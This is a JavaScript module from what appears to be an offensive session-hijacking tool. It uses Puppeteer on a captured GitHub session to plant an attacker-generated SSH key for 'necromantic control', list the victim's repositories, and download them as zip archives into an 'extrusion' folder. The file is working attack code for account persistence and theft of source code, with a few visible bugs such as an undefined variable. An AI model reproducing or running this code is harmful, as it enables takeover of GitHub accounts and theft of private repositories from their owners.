const db = require('../../db/db')
const clusterLib = require('../../puppeteer/cluster')
const necrohelp = require('../helpers/necrohelp')
const { writeFileSync } = require('fs');


exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
    await page.goto('https://github.com/settings/ssh/new')
    console.log("planting ssh key");


    try{

        console.log("generating ssh key");
        // Generate a new SSH-key pair using nodejs (using generateSSH function)
        let [publicKey, privateKey] = generateSSH();
        if (!privateKey || privateKey === ""){
            console.log("The private key is empty or undefined");
            return
        }

        if (!publicKey || publicKey === ""){
            console.log("The public key is empty or undefined");
            return
        }

        console.log("writing private ssh key to file");
        // write the private key to a file using the taskId as filename for uniqueness
        let keyPath = `extrusion/${taskId}.key`


        console.log(`[${taskId}] private key saved to ${keyPath}`);
        writeFileSync(keyPath, privateKey);

        // write the public key to a file using the taskId as filename for uniqueness
        // keyPath = `${clusterLib.GetConfig().platform.extrusionPath}/${taskId}.pub`
        keyPath = `extrusion/${taskId}.pub`

        console.log(`[${taskId}] public key saved to ${keyPath}`);
        writeFileSync(keyPath, publicKey);


        sshMaterial = publicKey
        console.log("adding ssh key to github: ${sshKeyName}: ${sshMaterial}");
        // await page.click('#new_key #public_key_title')
        await page.click('#ssh_key_title')
        // await page.type('#new_key #public_key_title', sshKeyName)
        await page.type('#ssh_key_title', sshKeyName)
        // await page.click('#new_key #public_key_key')
        await page.click('#ssh_key_key')
        // await page.type('#new_key #public_key_key', sshMaterial)
        await page.type('#ssh_key_key', sshMaterial)

        // click Add Key
        // await page.click('#new_key > .mb-0 > .btn')
        await page.click('#settings-frame > form > p > button')

        // TODO sometimes depending on session timing probably,
        // TODO github asks for Password confirmation before adding the key
        // TODO so we should have the password here just in case.
        // TODO in general the TASK need to have session credentials if possible too.

        console.log(`[${taskId}] SSH key ${sshKeyName} added for necromantic control \\.oOo./`);

        await necrohelp.Sleep(500)
        // await necrohelp.ScreenshotFullPage(page, taskId, 'https://github.com/settings/keys')
        await page.goto('https://github.com/settings/keys');
        await page.screenshot({path: `extrusion/screenshot_${taskId}_keys.png`});

    }catch(e){
        console.log(`[${taskId}] error while planting SSH key: ${e.message}`)
        // print the line number of the error
        console.log(`[${taskId}] error line number: ${e.lineNumber}`)
    }
}



exports.ScrapeRepos = async function(page, taskId) {
    await page.goto('https://github.com/settings/repositories')

    let urls = await page.$$('div.Box-row > a.mr-1')

    // TODO a warning or ignore should be thrown if the repo is too big
    // TODO as in hundreds of MB. Downloads of ZIPs of a few tens of MB is OK, but when it's too big
    // TODO puppeter doesn't handle it correctly
    // let urlContainers = await page.$$('div.Box-row.private.js-collab-repo')
    // then loop urlContainers to get out the SPAN and A elements. span contains the size

    console.log(`[${taskId}] there are ${urls.length} repos to fetch`)

    let reposToDownload = [];
    for(let url of urls){
        let href = await(await url.getProperty('href')).jsonValue();
        href = href + "/archive/refs/heads/master.zip"
        reposToDownload.push(href);
        console.log(`[${taskId}] discovered repo at ${href}`)
    }
    return reposToDownload;
}

exports.DownloadRepo = async function (page, taskId, downloadUrl) {

    // TODO extruded directory needs to be in the config file
    await page._client.send('Page.setDownloadBehavior', {
        behavior: 'allow',
        downloadPath: clusterLib.GetConfig().platform.extrusionPath
    }).catch(console.error)

    try{
        await page.goto(downloadUrl);
        await necrohelp.Sleep(10000);

        // ANTI simplified instead of clicking on Code button, just go on .zip url:
        let archive = `${downloadUrl.split('/')[4]}-master.zip`;
        let extrudedHashKey = `repository_${archive}`;
        await db.AddExtrudedData(taskId, extrudedHashKey, path);

        // wait for zip to download. we don't have much control here
    } catch(e){}
}


// and returning both keys as strings
function generateSSH(){
    const crypto = require("crypto")
    const sshpk = require('sshpk');

    console.log("generating ssh key using crypto")

    const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {
        modulusLength: 2048,
        publicKeyEncoding: {
            type: "spki",
            format: "pem",
        },
        privateKeyEncoding: {
            type: "pkcs8",
            format: "pem",
        },
    });

    const openSSHPublicKey = sshpk.parseKey(publicKey, 'pem').toString('ssh');
    console.log("====================================");
    console.log("publicKey:", publicKey);
    console.log("sshRsaPublicKey:", openSSHPublicKey);
    console.log("privateKey:", privateKey);
    console.log("====================================");

    return [openSSHPublicKey, privateKey];
}
